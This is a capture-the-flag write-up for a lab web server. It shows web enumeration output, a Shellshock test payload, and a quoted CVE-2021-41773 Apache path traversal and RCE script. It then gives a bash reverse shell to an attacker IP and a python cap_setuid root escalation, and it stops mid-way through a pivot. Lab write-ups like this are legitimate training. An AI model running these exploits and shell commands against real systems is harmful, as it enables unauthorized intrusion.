# writeups


ohMywebServer

# source code nothing serious


http://10.10.26.240/assets/
```
Index of /assets

    Parent Directory
    .DS_Store
    css/
    fonts/
    images/
    js/

```

/cgi-bin

gobuster with big.txt wordlist
===============================================================
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/assets               (Status: 301) [Size: 235] [--> http://10.10.26.240/assets/]
/cgi-bin/             (Status: 403) [Size: 199]


dirseach++===============
[21:32:22] 200 -  404B  - /assets/                                          
[21:32:22] 301 -  235B  - /assets  ->  http://10.10.26.240/assets/
[21:32:30] 403 -  199B  - /cgi-bin/                                         
[21:32:30] 500 -  528B  - /cgi-bin/test-cgi  

cgi-bin file, means likehood have a shellchock vulnerability, we gonna test
if this, it's vulnrebale

`$ wfuzz -v -c -H "User-agent: () { :;}; echo; echo vulnerable" --ss vulnerable -t 50 -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt http://xx.xx.xx.xx/FUZZ`



info nmap 

apache 2.4.9 vulnerable to RCE and PATH Transversal
```
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```
after the script ok, I got a shell 
`bash hello.sh targets.txt /bin/bash "bash -i >& /dev/tcp/10.18.90.251/8889 0>&1"`

It's a docker container, and I used linpeas just to look for some vulnerabilities to exploi
and I found python capabilities

```
Files with capabilities (limited to 50):
/usr/bin/python3.7 = cap_setuid+ep
```
and after that I go on gtfobins and guess what I found how to exploit this one
python with capabilities like that:

`python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

afther that I download nmap in static binaries, and upload it on the
box and make a scan with nmap with the ip that i found bizarre














